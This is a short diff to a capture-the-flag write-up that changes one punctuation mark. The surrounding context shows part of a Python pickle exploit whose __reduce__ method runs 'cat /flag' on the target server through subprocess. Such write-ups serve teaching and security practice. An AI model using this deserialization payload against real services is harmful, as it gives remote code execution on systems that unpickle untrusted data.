@@ -106,7 +106,7 @@ class RCE:
     def __reduce__(self):
         return (subprocess.check_output,(["cat","/flag"],))
 ```
-The flag would have been returned in the <code>/order</code> page:
+The flag would have been returned in the <code>/order</code> page.
 
 ![Alternative_Solution](https://user-images.githubusercontent.com/66698256/229853920-2302a399-7ae8-439d-b783-330197499681.png)
 
